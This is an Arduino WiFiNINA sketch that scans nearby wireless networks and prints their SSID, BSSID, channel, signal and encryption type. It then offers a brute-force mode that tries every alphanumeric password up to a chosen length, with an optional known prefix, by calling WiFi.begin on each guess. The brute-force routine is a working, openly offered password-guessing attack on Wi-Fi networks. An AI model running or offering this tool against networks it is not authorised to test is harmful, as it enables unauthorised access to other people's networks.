#include <WiFiNINA.h>

char ssid[1000] = "";        // your network SSID (name)
char pass[1000] = "";    // your network password (use for WPA, or use as key for WEP)
int status = WL_IDLE_STATUS;     // the Wifi radio's status
char alphabet[]={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

void setup() {
  //Initialize serial and wait for port to open:
  Serial.begin(9600);
  while (!Serial) {
    ; // wait for serial port to connect. Needed for native USB port only
  }

  // check for the presence of the shield:
  if (WiFi.status() == WL_NO_SHIELD) {
    Serial.println("WiFi shield not present");
    // don't continue:
    while (true);
  }
  
  // Print WiFi MAC address:
  printMacAddress();
  // i is the number of wifi scanning cycles
   for (int i = 1; i <= 3; i++) {
      // scan for existing networks:
      Serial.println("\nCycle " + String(i) + ": Scanning available networks...");
      listNetworks();
      delay(10000);
      // scans for the available encrypted WiFi networks every 10 seconds
  }
  
  Serial.println("\nPlease input your wifi name (SSID) that you want to connect to");
  bool check = true;
  while (check) {
      if (Serial.available() > 0){        // if you have data input
         String input = Serial.readString();        // read the whole input
         input.toCharArray(ssid, input.length()); // adding the string input as char * type
         check = false;
      } 
  }
  Serial.print("Wifi SSID: ");
  Serial.println(ssid);

  
  Serial.println("Do you want to authenticate to the network via password or brute force?\nType 'yes' for password method and 'no' for brute force method");
  check = true;
  while (check) {
      if (Serial.available() > 0){        // if you have data input
         String input = Serial.readString();        // read the whole input
         Serial.println(input);
         input.trim();
         if (input.substring(0).equals("yes")){
            Serial.println("Authentication by password method");
            check = false;
         } else if (input.substring(0).equals("no")){
             Serial.println("Authentication by brute force method");
             Serial.println("Please enter a prefix of the password if you know. Press 'send' without input for no prefix");
             check = true;
             String prefix;  
             while (check) {
               if (Serial.available() > 0){        // if you have data input
                 prefix = Serial.readString();        // read the whole input
                 check = false;
               } 
             }
             prefix.trim();
             Serial.print("Prefix: ");
             Serial.println(prefix.substring(0));
             
             Serial.println("How many characters would you want to brute force?");
             check = true;
             String number;  
             while (check) {
               if (Serial.available() > 0){        // if you have data input
                 number = Serial.readString();        // read the whole input
                 check = false;
               } 
             }
             Serial.print("Number of brute force chars: ");
             Serial.println(number.toInt());
             
             print_str(alphabet, prefix.substring(0), 62, number.toInt());
             while (true);
         } else {
             Serial.println("Unknown input. Please type 'yes' or 'no'");
         }
      } 
  }
  
  
  Serial.println("Please input the wifi password");
  check = true;
  while (check) {
      if (Serial.available() > 0){        // if you have data input
         String input = Serial.readString();        // read the whole input
         input.toCharArray(pass, input.length()); // adding the string input as char * type
         check = false;
      } 
  }
  Serial.print("Wifi Pass: ");
  Serial.println(pass);
  
  status = WiFi.begin(ssid, pass);
  
  // check for the presence of the shield:
  if (WiFi.status() == WL_NO_SHIELD) {
    Serial.println("WiFi shield not present");
    // don't continue:
    while (true);
  }

  // attempt to connect to Wifi network:
  while (status != WL_CONNECTED) {
    status = WiFi.begin(ssid, pass);
    if (status == WL_DISCONNECTED) {
       Serial.print("Wifi status: ");
       Serial.println(wl_status_to_string(WiFi.status()));
       Serial.println("Wrong password. Please input the wifi password again");
       check = true;
       while (check) {
         if (Serial.available() > 0){        // if you have data input
           String input = Serial.readString();        // read the whole input
           input.toCharArray(pass, input.length()); // adding the string input as char * type
           check = false;
         } 
       }
         Serial.print("Wifi Pass: ");
         Serial.println(pass);
    }

  }

  // once you are connected :
  Serial.println("\nYou're successfully connected to the network");
  Serial.print("Wifi status: ");
  Serial.println(wl_status_to_string(WiFi.status()));
  Serial.print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
}

void loop() {}

// the MAC address of this Arduino board
void printMacAddress() {
  byte mac[6];
  // print my MAC address:
  WiFi.macAddress(mac);
  Serial.println("MAC address of this Arduino board: ");
  Serial.print(mac[5], HEX);
  Serial.print(":");
  Serial.print(mac[4], HEX);
  Serial.print(":");
  Serial.print(mac[3], HEX);
  Serial.print(":");
  Serial.print(mac[2], HEX);
  Serial.print(":");
  Serial.print(mac[1], HEX);
  Serial.print(":");
  Serial.println(mac[0], HEX);
}


void listNetworks() {
  // scan for nearby networks:
  int numSsid = WiFi.scanNetworks();
  if (numSsid == -1) {
    Serial.println("Couldn't get a wifi connection");
    while (true);
  }

  // print the list of networks seen:
  Serial.print("Number of available networks: ");
  Serial.println(numSsid);

  // print the network number and name for each network found:
  for (int thisNet = 0; thisNet < numSsid; thisNet++) {
    Serial.print(thisNet);
    Serial.print(") ");
    Serial.print("\tChannel: ");
    Serial.print(WiFi.channel(thisNet));
    Serial.print("\t\tSSID: ");
    Serial.print(WiFi.SSID(thisNet));
    Serial.print("\t\tBSSID: ");
    printBSSID(thisNet);
    Serial.print("\tSignal: ");
    Serial.print(WiFi.RSSI(thisNet));
    Serial.print(" dBm");
    Serial.print("\t\tEncryption: ");
    printEncryptionType(WiFi.encryptionType(thisNet));
  }
}

void printBSSID(int thisNet) {
  byte bssid[6];
  WiFi.BSSID(thisNet, bssid);    
  Serial.print(bssid[5],HEX);
  Serial.print(":");
  Serial.print(bssid[4],HEX);
  Serial.print(":");
  Serial.print(bssid[3],HEX);
  Serial.print(":");
  Serial.print(bssid[2],HEX);
  Serial.print(":");
  Serial.print(bssid[1],HEX);
  Serial.print(":");
  Serial.println(bssid[0],HEX);
}

void printEncryptionType(int thisType) {
  // read the encryption type and print out the name:
  switch (thisType) {
    case ENC_TYPE_WEP:
      Serial.println("WEP");
      break;
    case ENC_TYPE_TKIP:
      Serial.println("WPA");
      break;
    case ENC_TYPE_CCMP:
      Serial.println("WPA2");
      break;
    case ENC_TYPE_NONE:
      Serial.println("None");
      break;
    case ENC_TYPE_AUTO:
      Serial.println("Auto");
      break;
  }
}

const char* wl_status_to_string(unsigned char status) {
  switch (status) {
    case 255: return "WL_NO_SHIELD";
    case 0: return "WL_IDLE_STATUS";
    case 1: return "WL_NO_SSID_AVAIL";
    case 2: return "WL_SCAN_COMPLETED";
    case 3: return "WL_CONNECTED";
    case 4: return "WL_CONNECT_FAILED";
    case 5: return "WL_CONNECTION_LOST";
    case 6: return "WL_DISCONNECTED";
  }
}

// Brute force password search
// The main recursive method to print all possible strings of length "length"
    void print_str(String str, String prefix, int n, int lenght) {
        if (lenght == 1) {
            for (int j = 0; j < n; j++){
                Serial.print("Current guess: ");
                //Serial.print(prefix);  
                //Serial.println(str[j]);      
                String input = prefix + str[j];
                input.toCharArray(pass, input.length()+1); // adding the string input as char * type
                Serial.println(pass);
                
                unsigned long start = millis();
                status = WiFi.begin(ssid, pass);
                unsigned long ending = millis();
                float delta = (float) (ending - start) / (float) 1000;
                Serial.print("Connection takes ");
                Serial.print(delta);
                Serial.println(" seconds");
                if (status == WL_CONNECTED) {
                    Serial.println("You're successfully connected to the network by brute force method!");
                    Serial.print("Wifi status: ");
                    Serial.println(wl_status_to_string(WiFi.status()));
                    Serial.print("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
                    break;
                } else {
                    Serial.print("Wrong trial: ");
                    Serial.println(wl_status_to_string(WiFi.status()));
                    Serial.println();
                }
              }
            }//Base case: lenght = 1, print the string "lenght" times + the remaining letter
        else {
            // One by one add all characters from "str" and recursively call for "lenght" equals to "lenght"-1
             for (int i = 0; i < n; i++){
                // Next character of input added
                print_str(str, prefix + str[i], n, lenght - 1);
                // "lenght" is decreased, because we have added a new character
              }
            }
    }
